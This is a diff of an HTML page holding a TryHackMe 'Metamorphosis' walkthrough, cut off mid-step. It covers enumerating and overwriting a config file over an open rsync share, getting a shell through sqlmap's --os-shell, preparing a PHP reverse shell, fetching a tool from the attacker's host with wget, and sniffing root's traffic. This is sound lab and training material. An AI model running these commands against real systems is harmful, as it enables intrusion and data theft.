@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -13,7 +13,7 @@
 
 
 
-<meta name="author" content="Animesh Roy"  />
+<meta name="author" content="Animesh Roy @anir0y  "  />
 <meta name="description" content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more..." />
 
 
@@ -34,6 +34,16 @@
 
 
 
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "it10lq8bk1");
+</script>
+
+
+
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://classroom.anir0y.in/">
 <meta property="og:title" content="Animesh Roy | Blogs & Writeups">
@@ -41,9 +51,11 @@
 <meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
 
 
+<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
+
 
 <meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="https://classroom.anir0y.in/post/tryhackme-metamorphosis/">
+<meta property="twitter:url" content="http://localhost:1313/post/tryhackme-metamorphosis/">
 
 <meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
 <meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
@@ -63,22 +75,29 @@
 
 
 
-<link rel="canonical" href="https://classroom.anir0y.in/post/tryhackme-metamorphosis/" />
+<link rel="canonical" href="http://localhost:1313/post/tryhackme-metamorphosis/" />
 
 
-<meta property="og:title" content="TryHackMe Metamorphosis" />
-<meta property="og:description" content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more..." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-metamorphosis/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-07-21T03:31:08+05:30" />
-<meta property="article:modified_time" content="2021-07-21T03:31:08+05:30" />
+<meta property="og:url" content="http://localhost:1313/post/tryhackme-metamorphosis/">
+  <meta property="og:site_name" content="Classroom">
+  <meta property="og:title" content="TryHackMe Metamorphosis">
+  <meta property="og:description" content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more...">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-07-21T03:31:08+05:30">
+    <meta property="article:modified_time" content="2021-07-21T03:31:08+05:30">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Rooms">
+    <meta property="article:tag" content="Thm">
+    <meta property="article:tag" content="Metamorphosis">
 
 
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="TryHackMe Metamorphosis"/>
-<meta name="twitter:description" content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more..."/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Metamorphosis">
+  <meta name="twitter:description" content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more...">
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -153,7 +172,7 @@
     <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
   </div>
   <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/classroom.anir0y.in'"></i>
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
   </div>
   
   <div class="item">
@@ -205,10 +224,10 @@
         <i class="save icon"></i>
       </button>
 
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Metamorphosis&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-metamorphosis%2f" class="ui circular twitter icon button">
+      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Metamorphosis&url=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-metamorphosis%2f" class="ui circular twitter icon button">
   <i class="twitter icon"></i>
 </a>
-<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-metamorphosis%2f" class="ui circular facebook icon button">
+<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-metamorphosis%2f" class="ui circular facebook icon button">
   <i class="facebook icon"></i>
 </a>
 
@@ -242,18 +261,18 @@
 
       <article class="main"><h2 id="overview">OverView</h2>
 <table>
-<thead>
-<tr>
-<th>Metamorphosis</th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Room</td>
-<td style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/93e2e34d54161c2a22b80a1eb5cd9857.jpeg" alt="logo"></td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Metamorphosis</th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Room</td>
+          <td style="text-align: center"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/93e2e34d54161c2a22b80a1eb5cd9857.jpeg" alt="logo"></td>
+      </tr>
+  </tbody>
 </table>
 <h2 id="recon">Recon</h2>
 <h3 id="nmap">nmap</h3>
@@ -342,70 +361,70 @@ data-ad-slot="7160066188"></ins></p>
 <ul>
 <li>
 <p>Enumerated the rsync module:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -rdt rsync://10.10.38.244:873
-Conf            All Confs
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rsync -rdt rsync://10.10.38.244:873
+</span></span><span style="display:flex;"><span>Conf            All Confs
+</span></span></code></pre></div></li>
 <li>
 <p>list content of <code>Conf</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -rdt rsync://10.10.38.244:873/Conf
-drwxrwxrwx          4,096 2021/04/11 01:33:08 .
--rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
--rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
--rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
--rw-r--r--            <span style="color:#ae81ff">332</span> 2021/04/10 01:31:38 ldap.conf
--rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
--rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
--rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
--rw-r--r--            <span style="color:#ae81ff">320</span> 2021/04/10 01:33:16 ports.conf
--rw-r--r--            <span style="color:#ae81ff">589</span> 2021/04/10 01:31:07 resolv.conf
--rw-r--r--             <span style="color:#ae81ff">29</span> 2021/04/10 01:32:56 screen-cleanup.conf
--rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
--rw-rw-r--             <span style="color:#ae81ff">72</span> 2021/04/11 01:33:06 webapp.ini
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rsync -rdt rsync://10.10.38.244:873/Conf
+</span></span><span style="display:flex;"><span>drwxrwxrwx          4,096 2021/04/11 01:33:08 .
+</span></span><span style="display:flex;"><span>-rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
+</span></span><span style="display:flex;"><span>-rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--            <span style="color:#ae81ff">332</span> 2021/04/10 01:31:38 ldap.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
+</span></span><span style="display:flex;"><span>-rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
+</span></span><span style="display:flex;"><span>-rw-r--r--            <span style="color:#ae81ff">320</span> 2021/04/10 01:33:16 ports.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--            <span style="color:#ae81ff">589</span> 2021/04/10 01:31:07 resolv.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--             <span style="color:#ae81ff">29</span> 2021/04/10 01:32:56 screen-cleanup.conf
+</span></span><span style="display:flex;"><span>-rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
+</span></span><span style="display:flex;"><span>-rw-rw-r--             <span style="color:#ae81ff">72</span> 2021/04/11 01:33:06 webapp.ini
+</span></span></code></pre></div></li>
 <li>
 <p>With access to the share, download everything available to the attacking machine.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -av rsync://10.10.38.244:873/Conf ./rsync
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rsync -av rsync://10.10.38.244:873/Conf ./rsync
+</span></span></code></pre></div></li>
 <li>
 <p>list the downloaded files:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">ls -l
-total <span style="color:#ae81ff">193</span>
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">4620</span> Jul <span style="color:#ae81ff">21</span> 03:54 access.conf
--rw-r--r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">1341</span> Apr <span style="color:#ae81ff">10</span> 01:26 bluezone.ini
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">2969</span> Jul <span style="color:#ae81ff">21</span> 03:54 debconf.conf
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout   <span style="color:#ae81ff">332</span> Jul <span style="color:#ae81ff">21</span> 03:54 ldap.conf
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout <span style="color:#ae81ff">94404</span> Jul <span style="color:#ae81ff">21</span> 03:54 lvm.conf
--rw-r--r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">9005</span> Apr <span style="color:#ae81ff">10</span> 01:28 mysql.ini
--rw-r--r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout <span style="color:#ae81ff">70207</span> Apr <span style="color:#ae81ff">10</span> 01:26 php.ini
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout   <span style="color:#ae81ff">320</span> Jul <span style="color:#ae81ff">21</span> 03:54 ports.conf
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout   <span style="color:#ae81ff">589</span> Jul <span style="color:#ae81ff">21</span> 03:54 resolv.conf
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout    <span style="color:#ae81ff">29</span> Jul <span style="color:#ae81ff">21</span> 03:54 screen-cleanup.conf
--rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">9542</span> Jul <span style="color:#ae81ff">21</span> 03:54 smb.conf
--rw-rw-r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout    <span style="color:#ae81ff">72</span> Apr <span style="color:#ae81ff">11</span> 01:33 webapp.ini
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ls -l
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">193</span>
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">4620</span> Jul <span style="color:#ae81ff">21</span> 03:54 access.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">1341</span> Apr <span style="color:#ae81ff">10</span> 01:26 bluezone.ini
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">2969</span> Jul <span style="color:#ae81ff">21</span> 03:54 debconf.conf
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout   <span style="color:#ae81ff">332</span> Jul <span style="color:#ae81ff">21</span> 03:54 ldap.conf
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout <span style="color:#ae81ff">94404</span> Jul <span style="color:#ae81ff">21</span> 03:54 lvm.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">9005</span> Apr <span style="color:#ae81ff">10</span> 01:28 mysql.ini
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout <span style="color:#ae81ff">70207</span> Apr <span style="color:#ae81ff">10</span> 01:26 php.ini
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout   <span style="color:#ae81ff">320</span> Jul <span style="color:#ae81ff">21</span> 03:54 ports.conf
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout   <span style="color:#ae81ff">589</span> Jul <span style="color:#ae81ff">21</span> 03:54 resolv.conf
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout    <span style="color:#ae81ff">29</span> Jul <span style="color:#ae81ff">21</span> 03:54 screen-cleanup.conf
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout  <span style="color:#ae81ff">9542</span> Jul <span style="color:#ae81ff">21</span> 03:54 smb.conf
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">502</span> dialout    <span style="color:#ae81ff">72</span> Apr <span style="color:#ae81ff">11</span> 01:33 webapp.ini
+</span></span></code></pre></div></li>
 <li>
 <p><code>webapp.ini</code> looks kinda intresting</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat webapp.ini 
-<span style="color:#f92672">[</span>Web_App<span style="color:#f92672">]</span>
-env <span style="color:#f92672">=</span> prod
-user <span style="color:#f92672">=</span> tom
-password <span style="color:#f92672">=</span> theCat
-
-<span style="color:#f92672">[</span>Details<span style="color:#f92672">]</span>
-Local <span style="color:#f92672">=</span> No
-</code></pre></div><p>seems like we have a wokring config, where currently <code>env</code> sets to <strong>prod</strong> and we can actually change and re-upload to the server. let&rsquo;s try doing this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat webapp.ini 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Web_App<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> prod
+</span></span><span style="display:flex;"><span>user <span style="color:#f92672">=</span> tom
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> theCat
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Details<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Local <span style="color:#f92672">=</span> No
+</span></span></code></pre></div><p>seems like we have a wokring config, where currently <code>env</code> sets to <strong>prod</strong> and we can actually change and re-upload to the server. let&rsquo;s try doing this.</p>
 <p>replace <code>env = prod</code> to <code>env = dev</code></p>
 </li>
 <li>
 <p>reuploading <code>webapp.ini</code> to the server</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">rsync -av rsync/webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
-sending incremental file list
-webapp.ini
-
-sent <span style="color:#ae81ff">171</span> bytes  received <span style="color:#ae81ff">41</span> bytes  84.80 bytes/sec
-total size is <span style="color:#ae81ff">71</span>  speedup is 0.33
-<span style="color:#75715e"># uploaded the edited file</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rsync -av rsync/webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
+</span></span><span style="display:flex;"><span>sending incremental file list
+</span></span><span style="display:flex;"><span>webapp.ini
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sent <span style="color:#ae81ff">171</span> bytes  received <span style="color:#ae81ff">41</span> bytes  84.80 bytes/sec
+</span></span><span style="display:flex;"><span>total size is <span style="color:#ae81ff">71</span>  speedup is 0.33
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uploaded the edited file</span>
+</span></span></code></pre></div></li>
 </ul>
 <h3 id="re-visiting-the-web">re-visiting the web</h3>
 <ul>
@@ -422,16 +441,16 @@ total size is <span style="color:#ae81ff">71</span>  speedup is 0.33
 </li>
 <li>
 <p>running <code>SQLMAP</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r username.req --level <span style="color:#ae81ff">3</span> --risk <span style="color:#ae81ff">3</span> --batch --os-shell
-<span style="color:#75715e"># trying to get a `os-shell` this way</span>
-</code></pre></div><p><img src="https://i.imgur.com/WEZbgc4.png" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r username.req --level <span style="color:#ae81ff">3</span> --risk <span style="color:#ae81ff">3</span> --batch --os-shell
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># trying to get a `os-shell` this way</span>
+</span></span></code></pre></div><p><img src="https://i.imgur.com/WEZbgc4.png" alt="img"></p>
 <p>and it worked! let&rsquo;s try and get a proper working shell</p>
 </li>
 <li>
 <p>With command execution, establish a persistent shell by transferring a php script and calling it with curl to return a reverse shell on the target.</p>
 <p>I will be uploading <code>php reverse shell</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp /usr/share/webshells/php/php-reverse-shell.php rev.php
-</code></pre></div><p><img src="https://i.imgur.com/FLWILS7.png" alt="img">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /usr/share/webshells/php/php-reverse-shell.php rev.php
+</span></span></code></pre></div><p><img src="https://i.imgur.com/FLWILS7.png" alt="img">
 change the IP</p>
 </li>
 <li>
@@ -473,82 +492,82 @@ data-ad-slot="7160066188"></ins></p>
 </li>
 <li>
 <p>running <code>PSPY</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># download to the BOX</span>
-wget http://10.17.4.40/pspy64s
-wget http://10.17.4.40/pspy64s
---2021-07-20 23:03:43--  http://10.17.4.40/pspy64s
-Connecting to 10.17.4.40:80... connected.
-HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
-Length: <span style="color:#ae81ff">1156536</span> <span style="color:#f92672">(</span>1.1M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
-Saving to: <span style="color:#e6db74">&#39;pspy64s&#39;</span>
-
-pspy64s             100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span>   1.10M   538KB/s    in 2.1s    
-
-2021-07-20 23:03:46 <span style="color:#f92672">(</span><span style="color:#ae81ff">538</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;pspy64s&#39;</span> saved <span style="color:#f92672">[</span>1156536/1156536<span style="color:#f92672">]</span>
-
-<span style="color:#75715e">## give +x &amp; run; wait for new process to spin</span>
-
-
-chmod +x pspy64s; ./pspy64s
-pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
-
-     ██▓███    ██████  ██▓███ ▓██   ██▓
-▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
-▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
-▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
-▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
-▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
-░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
-░░       ░  ░  ░  ░░       ▒ ▒ ░░  
-               ░           ░ ░     
-                              ░ ░ 
-
-...
-2021/07/20 23:05:06 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>   PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1877</span>   | python -c import pty; pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span> 
-<span style="color:#75715e"># my shell</span>
-
-2021/07/20 23:06:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">20564</span>  | /bin/sh /root/req.sh 
-2021/07/20 23:06:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">20563</span>  | /bin/sh /root/req.sh 
-2021/07/20 23:06:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">20562</span>  | /bin/sh -c /root/req.sh 
-<span style="color:#75715e"># well root is trying to run something!!</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># download to the BOX</span>
+</span></span><span style="display:flex;"><span>wget http://10.17.4.40/pspy64s
+</span></span><span style="display:flex;"><span>wget http://10.17.4.40/pspy64s
+</span></span><span style="display:flex;"><span>--2021-07-20 23:03:43--  http://10.17.4.40/pspy64s
+</span></span><span style="display:flex;"><span>Connecting to 10.17.4.40:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">1156536</span> <span style="color:#f92672">(</span>1.1M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: <span style="color:#e6db74">&#39;pspy64s&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pspy64s             100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span>   1.10M   538KB/s    in 2.1s    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2021-07-20 23:03:46 <span style="color:#f92672">(</span><span style="color:#ae81ff">538</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;pspy64s&#39;</span> saved <span style="color:#f92672">[</span>1156536/1156536<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## give +x &amp; run; wait for new process to spin</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x pspy64s; ./pspy64s
+</span></span><span style="display:flex;"><span>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     ██▓███    ██████  ██▓███ ▓██   ██▓
+</span></span><span style="display:flex;"><span>▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+</span></span><span style="display:flex;"><span>▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+</span></span><span style="display:flex;"><span>▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+</span></span><span style="display:flex;"><span>▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+</span></span><span style="display:flex;"><span>▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+</span></span><span style="display:flex;"><span>░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+</span></span><span style="display:flex;"><span>░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+</span></span><span style="display:flex;"><span>               ░           ░ ░     
+</span></span><span style="display:flex;"><span>                              ░ ░ 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>2021/07/20 23:05:06 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>   PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1877</span>   | python -c import pty; pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># my shell</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2021/07/20 23:06:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">20564</span>  | /bin/sh /root/req.sh 
+</span></span><span style="display:flex;"><span>2021/07/20 23:06:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">20563</span>  | /bin/sh /root/req.sh 
+</span></span><span style="display:flex;"><span>2021/07/20 23:06:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">20562</span>  | /bin/sh -c /root/req.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># well root is trying to run something!!</span>
+</span></span></code></pre></div></li>
 </ul>
 <p>Attempts to curl it as the www-data user fail and are met with a message stating it only interacts with the root user. Attempts to tunnel the internal port back to the target machine and curl as root there failed. So tcpdump was identified installed and used to capture the curl request. The resulting packet capture was transferred to the attacking machine and opened in wireshark.</p>
 <ul>
 <li>
 <p>run tcpdump in one terminal</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tcpdump -i any -s <span style="color:#ae81ff">0</span> -w 1.pcap
-<span style="color:#75715e"># my relative path is `/var/www/html/</span>
-<span style="color:#75715e">#reason being I can wget the pcap without terminating the tcpdump</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i any -s <span style="color:#ae81ff">0</span> -w 1.pcap
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># my relative path is `/var/www/html/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#reason being I can wget the pcap without terminating the tcpdump</span>
+</span></span></code></pre></div></li>
 <li>
 <p>run pspy on 2nd terminal</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@incognito:/tmp$ ./ps*
-./ps*
